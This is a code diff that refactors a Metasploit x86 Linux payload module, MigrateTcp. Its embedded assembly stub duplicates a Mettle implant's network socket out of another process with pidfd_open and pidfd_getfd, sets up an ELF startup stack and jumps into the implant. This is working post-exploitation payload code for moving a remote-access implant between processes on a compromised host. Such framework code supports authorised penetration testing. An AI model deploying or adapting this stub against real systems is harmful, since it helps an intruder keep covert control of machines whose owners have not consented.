@@ -1,89 +1,68 @@
 # -*- coding: binary -*-
+# frozen_string_literal: true
 
 require 'rex/elfparsey'
 
 module Msf
+  # Payload that supports socket-preserving migrations on x86.
+  module Payload::Linux::X86::MigrateTcp
+    include Msf::Payload::Linux::X86::Migrate
 
-###
-#
-# Payload that supports migration on x86.
-#
-###
+    #
+    # Duplicates the source Mettle transport and starts a Mettle process image.
+    #
+    def generate_migrate(opts = {})
+      entry_offset = elf_entry_point(opts.fetch(:payload))
 
-module Payload::Linux::X86::MigrateTcp
-
-  include Msf::Payload::Linux::X86::Migrate
-
-  def initialize(info={})
-    super(update_info(info,
-      'Name'        => 'Linux TCP Migration (x86)',
-      'Description' => 'Migration stub x86',
-      'Author'      => ['OJ Reeves', 'msutovsky-r7'],
-      'License'     => MSF_LICENSE,
-      'Platform'    => 'linux',
-      'Arch'        => ARCH_X86
-    ))
-  end
-
-  def elf_ep(payload)
-    elf = Rex::ElfParsey::Elf.new(Rex::ImageSource::Memory.new(payload))
-    elf.elf_header.e_entry
-  end
-
-  #
-  # Constructs the migrate stub on the fly
-  #
-  def generate_migrate(opts={})
-    entry_offset = elf_ep(opts[:payload])
-    %Q^
-      ; --- pidfd_open(pid, 0) ---
-      ; ebx = arg1 (pid), ecx = arg2 (flags)
-      pop ebx
+      %(
+      pop ebx                    ; source Mettle pid
       xor ecx, ecx
-      push 0x1b2
-      pop eax
-      int 0x80             ; pidfd_open -> eax = pidfd
+      mov eax, 434               ; pidfd_open(pid, 0)
+      int 0x80
+      test eax, eax
+      js migrate_failed
 
-      ; --- pidfd_getfd(pidfd, targetfd, 0) ---
-      ; ebx = arg1 (pidfd), ecx = arg2 (targetfd), edx = arg3 (flags)
-      pop ecx
-      xchg ebx, eax
+      pop ecx                    ; source transport fd
+      mov ebx, eax               ; source Mettle pidfd
       xor edx, edx
-      push 0x1b6
-      pop eax
-      int 0x80             ; pidfd_getfd -> eax = new_fd
+      mov eax, 438               ; pidfd_getfd(pidfd, fd, 0)
+      int 0x80
+      test eax, eax
+      js migrate_failed
 
-      xchg edi, eax        ; edi = new_fd (duplicated socket)
-      pop esi              ; esi = mmap base (payload address)
+      mov edi, eax               ; duplicated transport fd
+      pop esi                    ; process image address
 
-      ; setup stack for ELF _start
-      and esp, -0x10       ; align
-      add sp, 48           ; headroom for stack frame and prog name
-
-      mov eax, 109         ; prog name "m"
-      push eax
-      mov ecx, esp         ; ecx = ptr to prog name
+      and esp, -16
+      add esp, 64
+      push 0x6d                  ; argv[0] = "m"
+      mov ecx, esp
 
       xor ebx, ebx
-      push ebx             ; AT_NULL value
-      push ebx             ; AT_NULL type
-      push esi             ; AT_BASE value (mmap base)
-      mov eax, 7           ; AT_BASE type
-      push eax
-      push ebx             ; NULL (end of envp)
-      push ebx             ; NULL (end of argv)
-      push edi             ; argv[1] = sockfd
-      push ecx             ; argv[0] = prog name ptr
-      mov eax, 2           ; argc = 2
-      push eax
+      push ebx                   ; AT_NULL value
+      push ebx                   ; AT_NULL type
+      push esi                   ; AT_BASE value
+      push 7                     ; AT_BASE type
+      push ebx                   ; envp terminator
+      push ebx                   ; argv terminator
+      push edi                   ; argv[1] = transport fd
+      push ecx                   ; argv[0]
+      push 2                     ; argc
 
-      ; jump to ELF entry point
-      mov eax, #{entry_offset}
-      add esi, eax
+      add esi, #{entry_offset}
       jmp esi
-    ^
+
+    migrate_failed:
+      mov eax, 1                 ; exit(1)
+      mov ebx, 1
+      int 0x80
+    )
+    end
+
+    private
+
+    def elf_entry_point(payload)
+      Rex::ElfParsey::Elf.new(Rex::ImageSource::Memory.new(payload)).elf_header.e_entry
+    end
   end
-
-end
-
 end
